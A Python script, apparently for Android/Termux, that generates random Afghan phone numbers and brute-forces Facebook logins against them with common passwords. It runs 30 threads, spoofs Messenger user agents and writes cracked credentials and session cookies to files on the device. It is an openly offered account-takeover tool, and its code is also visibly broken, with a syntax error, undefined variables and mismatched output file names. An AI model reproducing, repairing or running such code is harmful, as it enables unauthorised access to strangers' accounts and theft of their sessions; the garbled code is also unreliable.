#coding :- utf-8
#update by :- ZAHID
#Script Owner : ZAHID
#---------------------
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
#---------------------NKING-LOGO---------------------#
logo ='''
\033[1;91m      
\033[1;91m         ðŸ˜‚ðŸ˜·ðŸ˜‹ðŸ˜‹ðŸ˜‹ðŸ˜‹

\033[1;97m         
\033[1;97m         
\033[1;91m         
\033[1;91m         
\033[1;97m    
\033[1;97m--------------------------------------------------
\033[1;91m Author      : ZAHID
\033[1;91m GitHub      : RAYEES SAMANDAR
\033[1;91m watsapp     : 0771211599
\033[1;91m Telegram    : 
\033[1;91m Status    : FREE
\033[1;97m--------------------------------------------------
'''
loop = 0
oks = []
pcp=[]
cps=[]
#---------------------NKING-MENU---------------------#
def menu():
	os.system('clear')
	print(logo)
	print('[1] Start Random Crack ')
	print('[0] Exit Menu')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		afg_randome()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [â€¢] Choose valid option\033[0;97m')
#---------------------NKING-RANDOM_CRACK---------------------#
def afg_randome():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For AFG (070,,078,077)ETC....')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int('99999')
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as ahd:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')
		for guru in user:
			ids = kode+guru
			mking_pass = [ids,guru,'100200','700800','afghanistan','afghan1234','khan123','khan12345','600700','800900','786786','Û±Û²Û³Û´ÛµÛ¶','Û±Û²Û³Û´ÛµÛ¶Û·Û¸Û¹']
			ahd.submit(rndm,ids,mking_pass)
	print(47*'\n\033[1;37m-')
	print('[âœ“] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/NKING-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/NKING-CP.txt')
	print(47*'-')
	print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [ZAHID-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in mking_pass:
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
			data = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=66jSZJ-0ACBYU3fcym8yV7hi; sb=66jSZPVjVr1OpJZVAIcNtCyb',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2006C3LI"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}

response = requests.get('https://mbasic.facebook.com/', cookies=cookies,,headers=head).json()
			if 'session_key' in po:
				uid = po['uid']
				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
				print('\r\r\033[1;32m [ZAHID-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/ZAHID-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [ZAHID-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/ZAHID-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()
